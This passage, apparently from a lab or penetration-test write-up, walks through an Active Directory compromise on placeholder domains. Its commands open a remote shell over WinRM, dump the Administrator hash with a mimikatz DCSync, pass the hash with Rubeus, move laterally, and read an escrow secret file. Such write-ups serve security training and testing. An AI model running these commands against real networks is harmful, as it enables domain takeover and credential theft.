```powershell
winrm set winrm/config/client '@{TrustedHosts="*"}' 
winrs.exe -r:10.200.12.1 -u:"syslogagent" -p:REDACTED_SECRET cmd
```

> Establish remote execution (RCE) for an interactive session and to enable LDAP enumeration from the compromised host.

## ATTACK CHAIN

`ACC-DC07 (Domain Controller)` → full domain control → direct access to credentials, tickets, and domain secrets → lateral movement → `ACC-DATA` → sensitive data recovered

## EXPLOITATION

#### 1. DCSync — Replicate Domain Credentials

With elevated privileges on the Domain Controller, DCSync replicates credentials directly from Active Directory.

```powershell
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:gcbacc.example /user:administrator" "exit"
# NTLM : REDACTED_HASH
# AES  : REDACTED_HASH
```

> Recovering the Administrator hash allows impersonating the account and establishing full control over the domain.

#### 2. Lateral Movement to ACC-DATA

A TGT is requested for the Administrator account using the recovered NTLM hash.

```powershell
.\Rubeus.exe asktgt /user:Administrator /ntlm:REDACTED_SECRET /domain:gcbacc.example /ptt

# Lateral movement to ACC-DATA
winrs.exe -r:acc-data.gcbacc.example cmd
```

#### 3. Sensitive Data Identified

```powershell
type C:\escrow2\escrow2.txt
# REDACTED_SECRET
```

> This value represents the second escrow fragment — a credential component that, combined with the first (`REDACTED_SECRET`), reconstructs the password `REDACTED_SECRET`, used to compromise `orgadmin` in `it.gcb.example` and escalate to forest root.
